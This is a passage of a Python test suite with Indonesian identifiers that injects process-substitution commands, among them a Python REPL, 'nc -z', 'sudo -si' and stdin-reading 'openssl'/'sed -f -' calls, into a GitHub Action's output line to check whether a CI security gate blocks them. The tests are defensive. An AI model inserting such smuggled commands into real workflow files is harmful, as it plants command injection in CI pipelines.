        periksa("python -m operand berkas: gerbang lolos (Audit 1090)", rc == 0)
        shutil.rmtree(sub182, ignore_errors=True)

        sub183 = klon(tmp, "sub183")
        berkas_aksi183 = os.path.join(
            sub183, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi183, encoding="utf-8") as f:
            isi_aksi183 = f.read()
        baris_aksi183 = [b for b in isi_aksi183.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru183 = isi_aksi183.replace(
                baris_aksi183,
                baris_aksi183.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3 -m asyncio; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru183 != isi_aksi183, \
            "suntikan aksi183 tidak menembak"
        with open(berkas_aksi183, "w", encoding="utf-8") as f:
            f.write(isi_baru183)
        rc, out = jalan(sub183,
                        [sys.executable, GERBANG, "--semua"])
        periksa("python -m asyncio REPL: gerbang gagal (Audit 1091)", rc != 0)
        shutil.rmtree(sub183, ignore_errors=True)

        sub184 = klon(tmp, "sub184")
        berkas_aksi184 = os.path.join(
            sub184, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi184, encoding="utf-8") as f:
            isi_aksi184 = f.read()
        baris_aksi184 = [b for b in isi_aksi184.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru184 = isi_aksi184.replace(
                baris_aksi184,
                baris_aksi184.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nc -z 127.0.0.1 9; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru184 != isi_aksi184, \
            "suntikan aksi184 tidak menembak"
        with open(berkas_aksi184, "w", encoding="utf-8") as f:
            f.write(isi_baru184)
        rc, out = jalan(sub184,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nc -z pindai: gerbang lolos (Audit 1092)", rc == 0)
        shutil.rmtree(sub184, ignore_errors=True)

        sub185 = klon(tmp, "sub185")
        berkas_aksi185 = os.path.join(
            sub185, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi185, encoding="utf-8") as f:
            isi_aksi185 = f.read()
        baris_aksi185 = [b for b in isi_aksi185.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru185 = isi_aksi185.replace(
                baris_aksi185,
                baris_aksi185.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(patch -i berkas2 berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru185 != isi_aksi185, \
            "suntikan aksi185 tidak menembak"
        with open(berkas_aksi185, "w", encoding="utf-8") as f:
            f.write(isi_baru185)
        rc, out = jalan(sub185,
                        [sys.executable, GERBANG, "--semua"])
        periksa("patch -i sumber berkas: gerbang lolos (Audit 1093)", rc == 0)
        shutil.rmtree(sub185, ignore_errors=True)

        sub186 = klon(tmp, "sub186")
        berkas_aksi186 = os.path.join(
            sub186, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi186, encoding="utf-8") as f:
            isi_aksi186 = f.read()
        baris_aksi186 = [b for b in isi_aksi186.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru186 = isi_aksi186.replace(
                baris_aksi186,
                baris_aksi186.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(zip -@; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru186 != isi_aksi186, \
            "suntikan aksi186 tidak menembak"
        with open(berkas_aksi186, "w", encoding="utf-8") as f:
            f.write(isi_baru186)
        rc, out = jalan(sub186,
                        [sys.executable, GERBANG, "--semua"])
        periksa("zip -@ tanpa arsip: gerbang lolos (Audit 1094)", rc == 0)
        shutil.rmtree(sub186, ignore_errors=True)

        sub187 = klon(tmp, "sub187")
        berkas_aksi187 = os.path.join(
            sub187, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi187, encoding="utf-8") as f:
            isi_aksi187 = f.read()
        baris_aksi187 = [b for b in isi_aksi187.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru187 = isi_aksi187.replace(
                baris_aksi187,
                baris_aksi187.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(rg --files; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru187 != isi_aksi187, \
            "suntikan aksi187 tidak menembak"
        with open(berkas_aksi187, "w", encoding="utf-8") as f:
            f.write(isi_baru187)
        rc, out = jalan(sub187,
                        [sys.executable, GERBANG, "--semua"])
        periksa("rg --files: gerbang lolos (Audit 1095)", rc == 0)
        shutil.rmtree(sub187, ignore_errors=True)

        sub188 = klon(tmp, "sub188")
        berkas_aksi188 = os.path.join(
            sub188, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi188, encoding="utf-8") as f:
            isi_aksi188 = f.read()
        baris_aksi188 = [b for b in isi_aksi188.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru188 = isi_aksi188.replace(
                baris_aksi188,
                baris_aksi188.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sign; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru188 != isi_aksi188, \
            "suntikan aksi188 tidak menembak"
        with open(berkas_aksi188, "w", encoding="utf-8") as f:
            f.write(isi_baru188)
        rc, out = jalan(sub188,
                        [sys.executable, GERBANG, "--semua"])
        periksa("opsi menggantung openssl: gerbang lolos (Audit 1096)", rc == 0)
        shutil.rmtree(sub188, ignore_errors=True)

        sub189 = klon(tmp, "sub189")
        berkas_aksi189 = os.path.join(
            sub189, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi189, encoding="utf-8") as f:
            isi_aksi189 = f.read()
        baris_aksi189 = [b for b in isi_aksi189.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru189 = isi_aksi189.replace(
                baris_aksi189,
                baris_aksi189.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sqlite3 -cmd; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru189 != isi_aksi189, \
            "suntikan aksi189 tidak menembak"
        with open(berkas_aksi189, "w", encoding="utf-8") as f:
            f.write(isi_baru189)
        rc, out = jalan(sub189,
                        [sys.executable, GERBANG, "--semua"])
        periksa("opsi menggantung sqlite3: gerbang lolos (Audit 1096)", rc == 0)
        shutil.rmtree(sub189, ignore_errors=True)

        sub190 = klon(tmp, "sub190")
        berkas_aksi190 = os.path.join(
            sub190, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi190, encoding="utf-8") as f:
            isi_aksi190 = f.read()
        baris_aksi190 = [b for b in isi_aksi190.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru190 = isi_aksi190.replace(
                baris_aksi190,
                baris_aksi190.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(head -n; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru190 != isi_aksi190, \
            "suntikan aksi190 tidak menembak"
        with open(berkas_aksi190, "w", encoding="utf-8") as f:
            f.write(isi_baru190)
        rc, out = jalan(sub190,
                        [sys.executable, GERBANG, "--semua"])
        periksa("opsi menggantung head: gerbang lolos (Audit 1096)", rc == 0)
        shutil.rmtree(sub190, ignore_errors=True)

        sub191 = klon(tmp, "sub191")
        berkas_aksi191 = os.path.join(
            sub191, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi191, encoding="utf-8") as f:
            isi_aksi191 = f.read()
        baris_aksi191 = [b for b in isi_aksi191.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru191 = isi_aksi191.replace(
                baris_aksi191,
                baris_aksi191.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sudo -si; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru191 != isi_aksi191, \
            "suntikan aksi191 tidak menembak"
        with open(berkas_aksi191, "w", encoding="utf-8") as f:
            f.write(isi_baru191)
        rc, out = jalan(sub191,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sudo -si ditolak: gerbang lolos (Audit 1097)", rc == 0)
        shutil.rmtree(sub191, ignore_errors=True)

        sub192 = klon(tmp, "sub192")
        berkas_aksi192 = os.path.join(
            sub192, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi192, encoding="utf-8") as f:
            isi_aksi192 = f.read()
        baris_aksi192 = [b for b in isi_aksi192.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru192 = isi_aksi192.replace(
                baris_aksi192,
                baris_aksi192.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bunzip2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru192 != isi_aksi192, \
            "suntikan aksi192 tidak menembak"
        with open(berkas_aksi192, "w", encoding="utf-8") as f:
            f.write(isi_baru192)
        rc, out = jalan(sub192,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bunzip2: gerbang gagal (Audit 1098)", rc != 0)
        shutil.rmtree(sub192, ignore_errors=True)

        sub193 = klon(tmp, "sub193")
        berkas_aksi193 = os.path.join(
            sub193, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi193, encoding="utf-8") as f:
            isi_aksi193 = f.read()
        baris_aksi193 = [b for b in isi_aksi193.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru193 = isi_aksi193.replace(
                baris_aksi193,
                baris_aksi193.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bzcat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru193 != isi_aksi193, \
            "suntikan aksi193 tidak menembak"
        with open(berkas_aksi193, "w", encoding="utf-8") as f:
            f.write(isi_baru193)
        rc, out = jalan(sub193,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bzcat: gerbang gagal (Audit 1098)", rc != 0)
        shutil.rmtree(sub193, ignore_errors=True)

        sub194 = klon(tmp, "sub194")
        berkas_aksi194 = os.path.join(
            sub194, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi194, encoding="utf-8") as f:
            isi_aksi194 = f.read()
        baris_aksi194 = [b for b in isi_aksi194.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru194 = isi_aksi194.replace(
                baris_aksi194,
                baris_aksi194.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xzcat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru194 != isi_aksi194, \
            "suntikan aksi194 tidak menembak"
        with open(berkas_aksi194, "w", encoding="utf-8") as f:
            f.write(isi_baru194)
        rc, out = jalan(sub194,
                        [sys.executable, GERBANG, "--semua"])
        periksa("xzcat: gerbang gagal (Audit 1098)", rc != 0)
        shutil.rmtree(sub194, ignore_errors=True)

        sub195 = klon(tmp, "sub195")
        berkas_aksi195 = os.path.join(
            sub195, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi195, encoding="utf-8") as f:
            isi_aksi195 = f.read()
        baris_aksi195 = [b for b in isi_aksi195.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru195 = isi_aksi195.replace(
                baris_aksi195,
                baris_aksi195.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unxz; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru195 != isi_aksi195, \
            "suntikan aksi195 tidak menembak"
        with open(berkas_aksi195, "w", encoding="utf-8") as f:
            f.write(isi_baru195)
        rc, out = jalan(sub195,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unxz: gerbang gagal (Audit 1098)", rc != 0)
        shutil.rmtree(sub195, ignore_errors=True)

        sub196 = klon(tmp, "sub196")
        berkas_aksi196 = os.path.join(
            sub196, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi196, encoding="utf-8") as f:
            isi_aksi196 = f.read()
        baris_aksi196 = [b for b in isi_aksi196.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru196 = isi_aksi196.replace(
                baris_aksi196,
                baris_aksi196.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unlzma; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru196 != isi_aksi196, \
            "suntikan aksi196 tidak menembak"
        with open(berkas_aksi196, "w", encoding="utf-8") as f:
            f.write(isi_baru196)
        rc, out = jalan(sub196,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unlzma: gerbang gagal (Audit 1098)", rc != 0)
        shutil.rmtree(sub196, ignore_errors=True)

        sub197 = klon(tmp, "sub197")
        berkas_aksi197 = os.path.join(
            sub197, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi197, encoding="utf-8") as f:
            isi_aksi197 = f.read()
        baris_aksi197 = [b for b in isi_aksi197.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru197 = isi_aksi197.replace(
                baris_aksi197,
                baris_aksi197.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat /dev/stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru197 != isi_aksi197, \
            "suntikan aksi197 tidak menembak"
        with open(berkas_aksi197, "w", encoding="utf-8") as f:
            f.write(isi_baru197)
        rc, out = jalan(sub197,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand /dev/stdin: gerbang gagal (Audit 1099)", rc != 0)
        shutil.rmtree(sub197, ignore_errors=True)

        sub198 = klon(tmp, "sub198")
        berkas_aksi198 = os.path.join(
            sub198, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi198, encoding="utf-8") as f:
            isi_aksi198 = f.read()
        baris_aksi198 = [b for b in isi_aksi198.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru198 = isi_aksi198.replace(
                baris_aksi198,
                baris_aksi198.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(head /dev/fd/0; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru198 != isi_aksi198, \
            "suntikan aksi198 tidak menembak"
        with open(berkas_aksi198, "w", encoding="utf-8") as f:
            f.write(isi_baru198)
        rc, out = jalan(sub198,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand /dev/fd/0: gerbang gagal (Audit 1099)", rc != 0)
        shutil.rmtree(sub198, ignore_errors=True)

        sub199 = klon(tmp, "sub199")
        berkas_aksi199 = os.path.join(
            sub199, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi199, encoding="utf-8") as f:
            isi_aksi199 = f.read()
        baris_aksi199 = [b for b in isi_aksi199.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru199 = isi_aksi199.replace(
                baris_aksi199,
                baris_aksi199.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep UTUH /dev/stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru199 != isi_aksi199, \
            "suntikan aksi199 tidak menembak"
        with open(berkas_aksi199, "w", encoding="utf-8") as f:
            f.write(isi_baru199)
        rc, out = jalan(sub199,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grep berkas /dev/stdin: gerbang gagal (Audit 1099)", rc != 0)
        shutil.rmtree(sub199, ignore_errors=True)

        sub200 = klon(tmp, "sub200")
        berkas_aksi200 = os.path.join(
            sub200, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi200, encoding="utf-8") as f:
            isi_aksi200 = f.read()
        baris_aksi200 = [b for b in isi_aksi200.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru200 = isi_aksi200.replace(
                baris_aksi200,
                baris_aksi200.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sort --random-source berkas2 -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru200 != isi_aksi200, \
            "suntikan aksi200 tidak menembak"
        with open(berkas_aksi200, "w", encoding="utf-8") as f:
            f.write(isi_baru200)
        rc, out = jalan(sub200,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sort --random-source bernilai: gerbang gagal (Audit 1100)", rc != 0)
        shutil.rmtree(sub200, ignore_errors=True)

        sub201 = klon(tmp, "sub201")
        berkas_aksi201 = os.path.join(
            sub201, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi201, encoding="utf-8") as f:
            isi_aksi201 = f.read()
        baris_aksi201 = [b for b in isi_aksi201.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru201 = isi_aksi201.replace(
                baris_aksi201,
                baris_aksi201.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(wc --total -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru201 != isi_aksi201, \
            "suntikan aksi201 tidak menembak"
        with open(berkas_aksi201, "w", encoding="utf-8") as f:
            f.write(isi_baru201)
        rc, out = jalan(sub201,
                        [sys.executable, GERBANG, "--semua"])
        periksa("wc --total bernilai: gerbang gagal (Audit 1100)", rc != 0)
        shutil.rmtree(sub201, ignore_errors=True)

        sub202 = klon(tmp, "sub202")
        berkas_aksi202 = os.path.join(
            sub202, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi202, encoding="utf-8") as f:
            isi_aksi202 = f.read()
        baris_aksi202 = [b for b in isi_aksi202.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru202 = isi_aksi202.replace(
                baris_aksi202,
                baris_aksi202.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(fmt -p x -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru202 != isi_aksi202, \
            "suntikan aksi202 tidak menembak"
        with open(berkas_aksi202, "w", encoding="utf-8") as f:
            f.write(isi_baru202)
        rc, out = jalan(sub202,
                        [sys.executable, GERBANG, "--semua"])
        periksa("fmt -p bernilai: gerbang gagal (Audit 1100)", rc != 0)
        shutil.rmtree(sub202, ignore_errors=True)

        sub203 = klon(tmp, "sub203")
        berkas_aksi203 = os.path.join(
            sub203, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi203, encoding="utf-8") as f:
            isi_aksi203 = f.read()
        baris_aksi203 = [b for b in isi_aksi203.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru203 = isi_aksi203.replace(
                baris_aksi203,
                baris_aksi203.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(basenc; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru203 != isi_aksi203, \
            "suntikan aksi203 tidak menembak"
        with open(berkas_aksi203, "w", encoding="utf-8") as f:
            f.write(isi_baru203)
        rc, out = jalan(sub203,
                        [sys.executable, GERBANG, "--semua"])
        periksa("basenc polos galat: gerbang lolos (Audit 1101)", rc == 0)
        shutil.rmtree(sub203, ignore_errors=True)

        sub204 = klon(tmp, "sub204")
        berkas_aksi204 = os.path.join(
            sub204, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi204, encoding="utf-8") as f:
            isi_aksi204 = f.read()
        baris_aksi204 = [b for b in isi_aksi204.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru204 = isi_aksi204.replace(
                baris_aksi204,
                baris_aksi204.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(basenc --base64; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru204 != isi_aksi204, \
            "suntikan aksi204 tidak menembak"
        with open(berkas_aksi204, "w", encoding="utf-8") as f:
            f.write(isi_baru204)
        rc, out = jalan(sub204,
                        [sys.executable, GERBANG, "--semua"])
        periksa("basenc bermode: gerbang gagal (Audit 1101)", rc != 0)
        shutil.rmtree(sub204, ignore_errors=True)

        sub205 = klon(tmp, "sub205")
        berkas_aksi205 = os.path.join(
            sub205, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi205, encoding="utf-8") as f:
            isi_aksi205 = f.read()
        baris_aksi205 = [b for b in isi_aksi205.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru205 = isi_aksi205.replace(
                baris_aksi205,
                baris_aksi205.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(cat --version; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru205 != isi_aksi205, \
            "suntikan aksi205 tidak menembak"
        with open(berkas_aksi205, "w", encoding="utf-8") as f:
            f.write(isi_baru205)
        rc, out = jalan(sub205,
                        [sys.executable, GERBANG, "--semua"])
        periksa("cat --version informasional: gerbang lolos (Audit 1102)", rc == 0)
        shutil.rmtree(sub205, ignore_errors=True)

        sub206 = klon(tmp, "sub206")
        berkas_aksi206 = os.path.join(
            sub206, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi206, encoding="utf-8") as f:
            isi_aksi206 = f.read()
        baris_aksi206 = [b for b in isi_aksi206.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru206 = isi_aksi206.replace(
                baris_aksi206,
                baris_aksi206.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sort --help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru206 != isi_aksi206, \
            "suntikan aksi206 tidak menembak"
        with open(berkas_aksi206, "w", encoding="utf-8") as f:
            f.write(isi_baru206)
        rc, out = jalan(sub206,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sort --help informasional: gerbang lolos (Audit 1102)", rc == 0)
        shutil.rmtree(sub206, ignore_errors=True)

        sub207 = klon(tmp, "sub207")
        berkas_aksi207 = os.path.join(
            sub207, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi207, encoding="utf-8") as f:
            isi_aksi207 = f.read()
        baris_aksi207 = [b for b in isi_aksi207.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru207 = isi_aksi207.replace(
                baris_aksi207,
                baris_aksi207.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(iconv -l; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru207 != isi_aksi207, \
            "suntikan aksi207 tidak menembak"
        with open(berkas_aksi207, "w", encoding="utf-8") as f:
            f.write(isi_baru207)
        rc, out = jalan(sub207,
                        [sys.executable, GERBANG, "--semua"])
        periksa("iconv -l informasional: gerbang lolos (Audit 1102)", rc == 0)
        shutil.rmtree(sub207, ignore_errors=True)

        sub208 = klon(tmp, "sub208")
        berkas_aksi208 = os.path.join(
            sub208, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi208, encoding="utf-8") as f:
            isi_aksi208 = f.read()
        baris_aksi208 = [b for b in isi_aksi208.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru208 = isi_aksi208.replace(
                baris_aksi208,
                baris_aksi208.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep -f - berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru208 != isi_aksi208, \
            "suntikan aksi208 tidak menembak"
        with open(berkas_aksi208, "w", encoding="utf-8") as f:
            f.write(isi_baru208)
        rc, out = jalan(sub208,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grep -f '-' beroperand: gerbang gagal (Audit 1103)", rc != 0)
        shutil.rmtree(sub208, ignore_errors=True)

        sub209 = klon(tmp, "sub209")
        berkas_aksi209 = os.path.join(
            sub209, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi209, encoding="utf-8") as f:
            isi_aksi209 = f.read()
        baris_aksi209 = [b for b in isi_aksi209.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru209 = isi_aksi209.replace(
                baris_aksi209,
                baris_aksi209.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sed -f - berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru209 != isi_aksi209, \
            "suntikan aksi209 tidak menembak"
        with open(berkas_aksi209, "w", encoding="utf-8") as f:
            f.write(isi_baru209)
        rc, out = jalan(sub209,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sed -f '-' beroperand: gerbang gagal (Audit 1103)", rc != 0)
        shutil.rmtree(sub209, ignore_errors=True)

        sub210 = klon(tmp, "sub210")
        berkas_aksi210 = os.path.join(
            sub210, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi210, encoding="utf-8") as f:
            isi_aksi210 = f.read()
        baris_aksi210 = [b for b in isi_aksi210.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru210 = isi_aksi210.replace(
                baris_aksi210,
                baris_aksi210.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(awk -f - berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru210 != isi_aksi210, \
            "suntikan aksi210 tidak menembak"
        with open(berkas_aksi210, "w", encoding="utf-8") as f:
            f.write(isi_baru210)
        rc, out = jalan(sub210,
                        [sys.executable, GERBANG, "--semua"])
        periksa("awk -f '-' beroperand: gerbang gagal (Audit 1103)", rc != 0)
        shutil.rmtree(sub210, ignore_errors=True)

        sub211 = klon(tmp, "sub211")
        berkas_aksi211 = os.path.join(
            sub211, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi211, encoding="utf-8") as f:
            isi_aksi211 = f.read()
        baris_aksi211 = [b for b in isi_aksi211.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru211 = isi_aksi211.replace(
                baris_aksi211,
                baris_aksi211.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(jq -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru211 != isi_aksi211, \
            "suntikan aksi211 tidak menembak"
        with open(berkas_aksi211, "w", encoding="utf-8") as f:
            f.write(isi_baru211)
        rc, out = jalan(sub211,
                        [sys.executable, GERBANG, "--semua"])
        periksa("jq -f '-' ditolak: gerbang lolos (Audit 1103)", rc == 0)
        shutil.rmtree(sub211, ignore_errors=True)

        sub212 = klon(tmp, "sub212")
        berkas_aksi212 = os.path.join(
            sub212, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi212, encoding="utf-8") as f:
            isi_aksi212 = f.read()
        baris_aksi212 = [b for b in isi_aksi212.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru212 = isi_aksi212.replace(
                baris_aksi212,
                baris_aksi212.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl base64; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru212 != isi_aksi212, \
            "suntikan aksi212 tidak menembak"
        with open(berkas_aksi212, "w", encoding="utf-8") as f:
            f.write(isi_baru212)
        rc, out = jalan(sub212,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl base64: gerbang gagal (Audit 1104)", rc != 0)
        shutil.rmtree(sub212, ignore_errors=True)

        sub213 = klon(tmp, "sub213")
        berkas_aksi213 = os.path.join(
            sub213, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi213, encoding="utf-8") as f:
            isi_aksi213 = f.read()
        baris_aksi213 = [b for b in isi_aksi213.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru213 = isi_aksi213.replace(
                baris_aksi213,
                baris_aksi213.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl smime -encrypt sert.pem; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru213 != isi_aksi213, \
            "suntikan aksi213 tidak menembak"
        with open(berkas_aksi213, "w", encoding="utf-8") as f:
            f.write(isi_baru213)
        rc, out = jalan(sub213,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl smime: gerbang gagal (Audit 1104)", rc != 0)
        shutil.rmtree(sub213, ignore_errors=True)

        sub214 = klon(tmp, "sub214")
        berkas_aksi214 = os.path.join(
            sub214, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi214, encoding="utf-8") as f:
            isi_aksi214 = f.read()
        baris_aksi214 = [b for b in isi_aksi214.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru214 = isi_aksi214.replace(
                baris_aksi214,
                baris_aksi214.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl passwd -stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru214 != isi_aksi214, \
            "suntikan aksi214 tidak menembak"
        with open(berkas_aksi214, "w", encoding="utf-8") as f:
            f.write(isi_baru214)
        rc, out = jalan(sub214,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl passwd -stdin: gerbang gagal (Audit 1104)", rc != 0)
        shutil.rmtree(sub214, ignore_errors=True)

        sub215 = klon(tmp, "sub215")
        berkas_aksi215 = os.path.join(
            sub215, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi215, encoding="utf-8") as f:
            isi_aksi215 = f.read()
        baris_aksi215 = [b for b in isi_aksi215.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru215 = isi_aksi215.replace(
                baris_aksi215,
                baris_aksi215.replace(
                    '>> "$GITHUB_OUTPUT"',
